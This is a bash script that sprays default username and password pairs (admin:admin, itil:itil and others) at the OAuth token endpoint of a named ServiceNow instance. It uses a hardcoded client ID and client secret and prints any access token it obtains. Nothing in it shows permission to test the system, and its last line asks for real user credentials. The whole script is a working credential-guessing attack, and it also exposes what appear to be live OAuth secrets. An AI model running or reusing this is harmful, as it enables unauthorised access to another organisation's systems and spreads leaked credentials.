#!/bin/bash

CLIENT_ID="0d08b5c2bed86dd05132321f2ba1dc3e"
CLIENT_SECRET="b7QWIjmkXI"
TOKEN_URL="https://devskandia.service-now.com/oauth_token.do"

echo "Testing ServiceNow OAuth with ojeste client"
echo "==========================================="

# Common ServiceNow test credentials
test_credentials=(
  "admin:admin"
  "admin:Admin123"
  "admin:password"
  "ojeste:ojeste"
  "ojeste:password"
  "test:test"
  "oauth:oauth"
  "itil:itil"
)

for creds in "${test_credentials[@]}"; do
  IFS=':' read -r user pass <<< "$creds"
  echo "Testing: $user"

  response=$(curl -s -X POST "$TOKEN_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    -d "grant_type=password&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&username=$user&password=$pass&scope=useraccount" 2>/dev/null)

  if echo "$response" | grep -q "access_token"; then
    echo "✅ SUCCESS! Got access token with user: $user"
    echo "$response" | python3 -m json.tool
    exit 0
  else
    echo "  Failed: $response"
  fi
done

echo ""
echo "No valid credentials found. Need actual ServiceNow user credentials."